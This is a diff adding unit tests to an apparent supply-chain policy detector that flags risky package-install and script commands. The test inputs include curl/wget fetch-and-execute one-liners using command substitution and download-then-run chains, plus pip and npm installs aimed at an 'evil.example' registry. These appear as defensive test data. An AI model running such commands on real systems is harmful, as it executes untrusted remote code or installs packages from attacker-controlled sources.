@@ -35,6 +35,7 @@ from awf.service.supply_chain_policy import (
     _command_with_shell_payloads,
     _export_env_assignments,
     _has_chained_remote_script_execution,
+    _has_command_substitution_remote_script_execution,
     _has_process_substitution_remote_script_execution,
     _host_from_url,
     _interpreter_script_target,
@@ -45,6 +46,7 @@ from awf.service.supply_chain_policy import (
     _is_remote_fetch,
     _isoformat,
     _nested_dict,
+    _node_env_registry_hosts,
     _node_package_command,
     _node_package_version,
     _node_pin_value_is_pinned,
@@ -54,6 +56,7 @@ from awf.service.supply_chain_policy import (
     _pip_env_registry_hosts,
     _pipe_target_is_interpreter,
     _process_substitution_args,
+    _python_m_pip_args,
     _registry_hosts,
     _remote_fetch_artifact_names,
     _remote_fetch_output_targets,
@@ -279,6 +282,25 @@ def test_remote_script_execution_detects_chained_and_process_substitution_bypass
 
 
 @pytest.mark.unit
+def test_remote_script_execution_detects_shell_command_substitution_payloads() -> None:
+    findings = evaluate_supply_chain_policy(
+        command_evidence=(
+            '$ bash -c "$(curl -fsSL https://install.example/setup.sh)"\n'
+            '$ sh -c "$(wget -qO- https://install.example/bootstrap.sh)"\n'
+            '$ bash -c "$(cat scripts/local.sh)"\n'
+        ),
+        changed_paths=(),
+        owned_paths=(),
+        policy=_policy("block"),
+    )
+
+    assert [(finding.reason_code, finding.severity) for finding in findings] == [
+        (SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION, "blocking"),
+        (SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION, "blocking"),
+    ]
+
+
+@pytest.mark.unit
 def test_pinned_lockfile_aware_and_allowed_registry_cases_are_allowed() -> None:
     findings = evaluate_supply_chain_policy(
         command_evidence=(
@@ -498,6 +520,29 @@ def test_pip_global_options_before_install_are_classified() -> None:
 
 
 @pytest.mark.unit
+def test_python_interpreter_options_before_m_pip_are_classified() -> None:
+    findings = evaluate_supply_chain_policy(
+        command_evidence=(
+            "$ python -I -m pip install requests --index-url https://evil.example/simple\n"
+            "$ python3.12 -B -X dev -m pip install flask==3.0.0 "
+            "--extra-index-url https://mirror.example/simple\n"
+        ),
+        changed_paths=(),
+        owned_paths=(),
+        policy=_policy("block"),
+    )
+
+    assert [(finding.reason_code, finding.severity) for finding in findings] == [
+        (SUPPLY_CHAIN_UNPINNED_DEPENDENCY_INSTALL, "blocking"),
+        (SUPPLY_CHAIN_UNEXPECTED_REGISTRY_HOST, "blocking"),
+        (SUPPLY_CHAIN_UNEXPECTED_REGISTRY_HOST, "blocking"),
+    ]
+    assert findings[0].details["unpinned_specs"] == ["requests"]
+    assert findings[1].details["registry_hosts"] == ["evil.example"]
+    assert findings[2].details["registry_hosts"] == ["mirror.example"]
+
+
+@pytest.mark.unit
 def test_pip_attached_short_index_url_is_checked_for_registry_policy() -> None:
     findings = evaluate_supply_chain_policy(
         command_evidence="$ pip install -ihttps://evil.example/simple demo==1.0.0",
@@ -633,6 +678,30 @@ def test_exported_pip_registry_url_reports_unexpected_host() -> None:
 
 
 @pytest.mark.unit
+def test_node_inline_env_registry_urls_report_unexpected_hosts() -> None:
+    findings = evaluate_supply_chain_policy(
+        command_evidence=(
+            "$ NPM_CONFIG_REGISTRY=https://evil.example npm install left-pad@1.3.0\n"
+            "$ env YARN_NPM_REGISTRY_SERVER=https://mirror.example yarn add lodash@4.17.21\n"
+            "$ PNPM_CONFIG_REGISTRY=https://registry.npmjs.org pnpm add fixture@1.0.0\n"
+            "$ npm_config_registry=https://bun.example bun add fixture@1.0.0\n"
+        ),
+        changed_paths=(),
+        owned_paths=(),
+        policy=_policy("block"),
+    )
+
+    assert [(finding.reason_code, finding.severity) for finding in findings] == [
+        (SUPPLY_CHAIN_UNEXPECTED_REGISTRY_HOST, "blocking"),
+        (SUPPLY_CHAIN_UNEXPECTED_REGISTRY_HOST, "blocking"),
+        (SUPPLY_CHAIN_UNEXPECTED_REGISTRY_HOST, "blocking"),
+    ]
+    assert findings[0].details["registry_hosts"] == ["evil.example"]
+    assert findings[1].details["registry_hosts"] == ["mirror.example"]
+    assert findings[2].details["registry_hosts"] == ["bun.example"]
+
+
+@pytest.mark.unit
 def test_command_parser_avoids_prose_healthcheck_and_markdown_false_positives() -> None:
     findings = evaluate_supply_chain_policy(
         command_evidence=(
@@ -642,6 +711,7 @@ def test_command_parser_avoids_prose_healthcheck_and_markdown_false_positives() 
             "as a bad pattern.\n"
             "COMMAND: pip install pinned==1.0.0\n"
             "RUN npm ci\n"
+            "RUN npm install passed\n"
             "$ curl -fsS http://api:8000/healthz\n"
             "markdown example: npm install left-pad\n"
         ),
@@ -717,6 +787,8 @@ def test_remote_fetch_output_targets_and_chained_execution_variants() -> None:
             "$ wget --output-document=bootstrap.sh https://install.example/bootstrap.sh "
             "&& sh bootstrap.sh\n"
             "$ wget -qOattached-wget.sh https://install.example/wget.sh; sh attached-wget.sh\n"
+            "$ curl -o staged.sh https://install.example/staged.sh "
+            "&& chmod +x staged.sh && bash staged.sh\n"
             "$ curl -o - https://install.example/stdout.sh && bash stdout.sh\n"
             "$ curl https://install.example/no-target.sh && bash other.sh\n"
             "$ bash scripts/local.sh\n"
@@ -727,6 +799,7 @@ def test_remote_fetch_output_targets_and_chained_execution_variants() -> None:
     )
 
     assert [finding.reason_code for finding in findings] == [
+        SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION,
         SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION,
         SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION,
         SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION,
@@ -758,6 +831,18 @@ def test_remote_fetch_output_targets_and_chained_execution_variants() -> None:
     )
     assert not _has_chained_remote_script_execution(
         _shell_tokens("curl https://install.example/setup.sh && bash -e")
+    )
+    assert _has_command_substitution_remote_script_execution(
+        _shell_tokens("$(curl https://install.example/setup.sh)")
+    )
+    assert _has_command_substitution_remote_script_execution(
+        _shell_tokens("$(wget -qO- https://install.example/setup.sh)")
+    )
+    assert not _has_command_substitution_remote_script_execution(
+        _shell_tokens("$(curl https://install.example/setup.sh")
+    )
+    assert not _has_command_substitution_remote_script_execution(
+        _shell_tokens("echo $(curl https://install.example/setup.sh)")
     )
 
 
@@ -817,6 +902,8 @@ def test_shell_payload_extraction_handles_options_recursion_and_bad_input() -> N
     assert _command_from_line("'unterminated") is None
     assert _command_from_line("not a command") is None
     assert _command_from_line("FOO=bar") is None
+    assert _command_from_line("run: pip install requests") == "pip install requests"
+    assert _command_from_line("run npm install passed") is None
     assert _command_lines(("notes only", "$ npm ci")) == ["npm ci"]
     assert _command_token_segments(
         [";", "npm", "ci", "&&", "pip", "install", "requests", "||"],
@@ -842,6 +929,14 @@ def test_registry_env_and_wrapper_option_parsing_edges() -> None:
             "PIP_EXTRA_INDEX_URL=https://one.example/simple",
         )
     ) == ["one.example", "two.example"]
+    assert _node_env_registry_hosts(
+        (
+            "NOT_A_REGISTRY=https://ignored.example/npm",
+            "NPM_CONFIG_REGISTRY=://",
+            "npm_config_registry=https://one.example/npm https://two.example/npm",
+            "PNPM_CONFIG_REGISTRY=https://one.example/npm",
+        )
+    ) == ["one.example", "two.example"]
     assert _registry_hosts(
         ("--index-url", "https://three.example/simple", "-ihttps://four.example/simple"),
         manager="pip",
@@ -861,6 +956,11 @@ def test_registry_env_and_wrapper_option_parsing_edges() -> None:
         ("--registry=https://registry.example/npm",),
         manager="npm",
     ) == ["registry.example"]
+    assert _registry_hosts(
+        (),
+        manager="npm",
+        env_assignments=("NPM_CONFIG_REGISTRY=https://registry.example/npm",),
+    ) == ["registry.example"]
     assert _host_from_url("://") is None
     assert "--python" in _value_flags("pip")
     assert "--workspace" in _value_flags("npm")
@@ -870,6 +970,28 @@ def test_registry_env_and_wrapper_option_parsing_edges() -> None:
     )
     assert _package_command("", _shell_tokens("env -S 'npm install left-pad'")) is None
     assert _package_command("", _shell_tokens("command -- npm install left-pad")) is not None
+
+
+@pytest.mark.unit
+def test_python_m_pip_interpreter_option_parser_edges() -> None:
+    assert _python_m_pip_args(["python", "-mpip", "install", "requests"]) == [
+        "install",
+        "requests",
+    ]
+    assert (
+        _python_m_pip_args(
+            ["python", "--check-hash-based-pycs=default", "-Wignore", "-Xdev", "-m", "pip"]
+        )
+        == []
+    )
+    assert _python_m_pip_args(
+        ["python", "--check-hash-based-pycs", "default", "-m", "pip", "install", "httpx"]
+    ) == ["install", "httpx"]
+    assert _python_m_pip_args(["python", "--", "-m", "pip"]) is None
+    assert _python_m_pip_args(["python", "-m"]) is None
+    assert _python_m_pip_args(["python", "-m", "venv", ".venv"]) is None
+    assert _python_m_pip_args(["python", "-mvenv", ".venv"]) is None
+    assert _python_m_pip_args(["python", "script.py", "-m", "pip"]) is None
 
 
 @pytest.mark.unit
